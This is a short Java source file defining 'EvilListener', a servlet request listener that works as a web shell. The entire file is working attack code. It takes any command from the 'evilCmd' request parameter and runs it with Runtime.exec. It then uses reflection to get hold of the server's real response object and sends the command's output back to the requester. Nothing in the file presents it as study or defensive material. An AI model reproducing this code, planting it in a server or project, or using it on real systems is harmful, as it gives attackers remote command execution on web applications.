package com.vdt;

import jakarta.servlet.*;
import jakarta.servlet.annotation.WebListener;
import jakarta.servlet.http.HttpServletResponse;

import java.io.InputStream;
import java.lang.reflect.Field;

//@WebListener
public class EvilListener implements ServletRequestListener {
    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        // This method is called when a request is initialized
        ServletRequest request = sre.getServletRequest();
        String cmd = request.getParameter("evilCmd");
        if (cmd != null) {
            try {
                Field requestField = request.getClass().getDeclaredField("request");
                System.out.println("request runtime class: " + request.getClass());
                requestField.setAccessible(true);
                Object realRequest = requestField.get(request);

                // get current response object using reflection
                Field responseField = realRequest.getClass().getDeclaredField("response");
//                System.out.println("real request runtime class: " + realRequest.getClass());
                responseField.setAccessible(true);
                HttpServletResponse response = (HttpServletResponse) responseField.get(realRequest);

                response.reset();
                ServletOutputStream output = response.getOutputStream();
                InputStream input = Runtime.getRuntime().exec(cmd).getInputStream();

                byte[] buffer = new byte[1024];
                int len;
                while ((len = input.read(buffer)) != -1) {
                    output.write(buffer, 0, len);
                }

                output.flush();
                output.close();
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }
    }
}